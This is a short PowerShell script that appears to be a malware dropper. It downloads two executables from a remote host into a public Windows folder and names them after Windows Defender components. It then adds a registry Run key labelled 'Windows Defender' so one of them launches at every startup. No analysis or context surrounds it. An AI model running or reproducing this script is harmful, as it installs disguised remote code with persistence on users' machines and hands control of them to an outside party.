(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/64.signed","C:\Users\Public\MSASC.exe")
(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/MS_ASC64_1.signed","C:\Users\Public\MSASCuiL.exe")
New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
